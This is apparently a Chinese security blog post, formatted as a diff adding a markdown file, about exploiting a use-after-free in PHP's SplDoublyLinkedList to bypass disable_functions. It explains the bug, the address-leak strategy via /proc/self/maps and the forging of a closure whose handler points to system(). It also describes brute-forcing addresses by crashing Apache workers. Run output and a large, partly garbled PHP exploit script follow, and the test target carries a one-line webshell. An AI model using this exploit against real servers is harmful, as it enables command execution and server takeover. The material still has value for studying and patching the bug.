@@ -1,0 +1,164 @@
+### 前言
+9.20+ 号在 bugs.php.net 上看到的一个 UAF BUG：
+，报告人已经写出了 bypass disabled functions 的利用脚本并且私发了给官方，不过官方似乎还没有修复，原因不明。
+试了一下，bug 能在 7.4.10、7.3.22、7.2.34 版本触发，虽然报告者没有公布利用脚本，不过我们可以自己写一个。
+* * *
+### 触发 UAF
+BUG 发生在 PHP 内置类 SplDoublyLinkedList，一个双链表类，有一个指针 traverse_pointer 用于指向当前位置。
+在调用 unset 删除链表元素的时候，处理顺序上有点问题：
+    if (element != NULL) {
+        /* connect the neightbors */
+        ...
+        /* take care of head/tail */
+        ...
+        /* finally, delete the element */
+        llist->count--;
+        if(llist->dtor) {
+            llist->dtor(element);
+        }
+        if (intern->traverse_pointer == element) {
+            SPL_LLIST_DELREF(element);
+            intern->traverse_pointer = NULL;
+        }
+        ...
+    }
+可以看到，删除元素的操作被放在了置空 traverse_pointer 指针前。
+所以在删除一个对象时，我们可以在其构析函数中通过 current 访问到这个对象，也可以通过 next
+访问到下一个元素。如果此时下一个元素已经被删除，就会导致 UAF。
+具体的触发脚本可以参考报告人给出的测试代码。
+### 编写利用
+先看一下链表元素的结构体：
+    typedef struct _spl_ptr_llist_element {
+        struct _spl_ptr_llist_element *prev;
+        struct _spl_ptr_llist_element *next;
+        int                            rc;
+        zval                           data;
+    } spl_ptr_llist_element;
+前后指针 + 引用计数 + zval 格式的 data，加起来就是 0x28。
+而最方便控制的 zend_string 结构则是这样的：
+    struct _zend_string {
+        zend_refcounted_h gc;
+        zend_ulong        h;                /* hash value */
+        size_t            len;
+        char              val[1];
+    };
+也就是说用一个字符串进行 UAF，我们基本可以控制元素的整个 data 部分。
+然后问题就来了，data 部分是个 zval，一般是个地址 + 类型的两地址单元数据，我们可以通过这里泄露某个地址的数据，但是我们没有泄露这个地址的途径。
+一开始我想通过 next 导致的链表元素引用计数 + 1（对应到字符串中就是字符串长度 + 1）来一个个字节地泄露出被删除元素 data
+段存在的地址，结果发现 PHP 在为字符串分配地址的时候基本都会在最后加上个不算在字符串长度中的 \x00，所以这个思路也走不通了。
+所以最后是按照两种情况来处理，首先是没有限制 openbase_dir 的情况，可以读取 /proc/self/maps 来获取地址，具体思路如下：
+  * 在链表中放置 3 个主要元素，分别是触发构析函数的对象、用来 UAF 的元素、closure 对象
+  * 读取 /proc/self/maps，从中找到 PHP 申请的 Chunk（Chunk 最小为 2MB）
+  * 在链表中放入一堆奇奇怪怪数据的元素，然后从 Chunk 中每 0x1000 字节搜索一次这些奇怪的元素
+  * 通过该元素的前指针往前找到链表中的 closure 对象
+  * 泄露出 closure handler 的地址，然后往前搜索 system 函数 handler 的地址
+  * 伪造一个 closure 对象，将其 handler 设置为 system
+  * 调用该 closure 对象，调用 system
+比较要注意的一点就是引用计数，具体原因可以自行调试。
+执行 php -v 的结果如下（Docker 镜像为 php:7.4.10-apache，上面只放了一句话 webshell）：
+    [+]Execute Payload, Output is:
+    [+]PHP Chunk: 7f026be00000 - 7f026c000000, length: 0x200000
+    [+]SplDoublyLinkedList Element: 7f026be540f0
+    [+]Closure Chunk: 7f026be544b0
+    [+]Closure Object: 7f026be588c0
+    [+]Closure Handler: 7f026d4f9780
+    [+]Find system's handler: 7f026cae9100
+    [+]Executing command:
+    PHP 7.4.10 (cli) (built: Sep 10 2020 13:50:32) ( NTS )
+    Copyright (c) The PHP Group
+    Zend Engine v3.4.0, Copyright (c) Zend Technologies
+    [+]Done
+    [+]Execute Payload Over.
+如果限制了 openbase_dir，就比较麻烦了，因为无法直接读取到 PHP Chunk 的地址，就只能通过爆破来获取，但是每次爆破都会导致 Apache
+子进程崩溃重启一次（PHP 的 Web 服务一般是父子进程的形式，所以单纯子进程重启不会影响 PHP Chunk 的地址，除非将整个 Apache/FPM
+重启），所以虽然说要爆破，但是也不能从 0x7f0000000000 开始每 0x20000 爆破一次，这样需要的爆破次数太多了。
+我想到的办法就是申请一个很大的 Chunk，比如 PHP 一般配置下最大内存使用为 128MB，我就申请一个 120MB 的 Chunk，而这个 Chunk
+一般会排布在 Apache so 扩展、PHP Chunk 等数据的上方，所以我从 0x7f0000000000 开始每 0x8000000
+爆破一次，如果没有崩溃就说明找到了这个大 Chunk，最坏的情况下需要爆破 8000+ 次。
+之后只要再每 0x20000 进行循环泄露出 PHP Chunk 和链表地址（偶尔会因为读取越界导致崩溃，一般不超过 100 次），后面就跟没有限制
+openbase_dir 的情况一致了，一个比较快的执行结果如下：
+    [+]Execute Payload, Output is:
+    [+]Bomb 100 times, address of first chunk maybe: 0x7f0320000000L
+    [+]Bomb 200 times, address of first chunk maybe: 0x7f0640000000L
+    [+]Bomb 300 times, address of first chunk maybe: 0x7f0960000000L
+    [+]Bomb 400 times, address of first chunk maybe: 0x7f0c80000000L
+    [+]Bomb 500 times, address of first chunk maybe: 0x7f0fa0000000L
+    [+]Bomb 600 times, address of first chunk maybe: 0x7f12c0000000L
+    [+]Bomb 700 times, address of first chunk maybe: 0x7f15e0000000L
+    [+]Bomb 800 times, address of first chunk maybe: 0x7f1900000000L
+    [+]Bomb 900 times, address of first chunk maybe: 0x7f1c20000000L
+    [+]Bomb 1000 times, address of first chunk maybe: 0x7f1f40000000L
+    [+]Bomb 1100 times, address of first chunk maybe: 0x7f2260000000L
+    [+]Bomb 1200 times, address of first chunk maybe: 0x7f2580000000L
+    [+]Bomb 1300 times, address of first chunk maybe: 0x7f28a0000000L
+    [+]Bomb 1400 times, address of first chunk maybe: 0x7f2bc0000000L
+    ---------------------------------------------------------------------------------    [+]Bomb 10 times, address of php chunk maybe: 0x7f2e51400000L
+    [+]Bomb 20 times, address of php chunk maybe: 0x7f2e52800000L
+    [+]Bomb 30 times, address of php chunk maybe: 0x7f2e53c00000L
+    [+]Bomb 40 times, address of php chunk maybe: 0x7f2e55000000L
+    [+]Bomb 50 times, address of php chunk maybe: 0x7f2e56400000L
+    [+]Bomb 60 times, address of php chunk maybe: 0x7f2e57800000L
+    [+]Bomb 70 times, address of php chunk maybe: 0x7f2e58c00000L
+    [+]PHP crash 14 times
+    ---------------------------------------------------------------------------------    [+]SplDoublyLinkedList Element: 7f2e596540f0
+    [+]Closure Chunk: 7f2e596544b0
+    [+]Closure Object: 7f2e59658b40
+    [+]Find system's handler: 7f2e5a310100
+    [+]Executing command:
+    PHP 7.4.10 (cli) (built: Sep 10 2020 13:50:32) ( NTS )
+    Copyright (c) The PHP Group
+    Zend Engine v3.4.0, Copyright (c) Zend Technologies
+    [+]Done
+    [+]Execute Payload Over.
+崩溃了 1400+ 次。
+### 利用脚本
+PHP 部分（仅在 7.4.10、7.3.22、7.2.34 版本测试），写的比较烂，师傅们凑合着看一下：
+    >= 8;
+        }
+    }
+    function s2i($s) {
+        $result = 0;
+        for ($x = 0;$x  current());
+    }
+    function getPHPChunk($maps) {
+        $pattern = '/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /';
+        preg_match_all($pattern, $maps, $match);
+        foreach ($match[1] as $value) {
+            list($start, $end) = explode("-", $value);
+            if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) >= 0x200000 && $length <= 0x300000) {
+                $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);
+                echo "[+]PHP Chunk: " . $start . " - " . $end . ", length: 0x" . dechex($length) . "\n";
+                return $address;
+            }
+        }
+    }
+    function bomb1(&$a) {
+        if (leak($a, s2i($_GET["test1"])) === 0x5454545454545454) {
+            return (s2i($_GET["test1"]) & 0x7ffff0000000);
+        }else {
+            die("[!]Where is here");
+        }
+    }
+    function bomb2(&$a) {
+        $start = s2i($_GET["test2"]);
+        return getElement($a, array($start, $start + 0x200000, 0x200000));
+        die("[!]Not Found");
+    }
+    function getElement(&$a, $address) {
+        for ($x = 0;$x < ($address[2] / 0x1000 - 2);$x++) {
+            $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000;
+            for ($y = 0;$y < 5;$y++) {
+                if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 && ((leak($a, $addr + $y * 0x08 - 0x08) & 0xffffffff) === 0x01)){
+                    echo "[+]SplDoublyLinkedList Element: " . dechex($addr + $y * 0x08 - 0x18) . "\n";
+                    return $addr + $y * 0x08 - 0x18;
+                }
+            }
+        }
+    }
+    function getClosureChunk(&$a, $address) {
+        do {
+            $address = leak($a, $address);
+        }while(leak($a, $address) !== 0x00);
+        echo "[+]Closure Chunk: " . dechex($address) . "\n";
+        return $address;
+    }
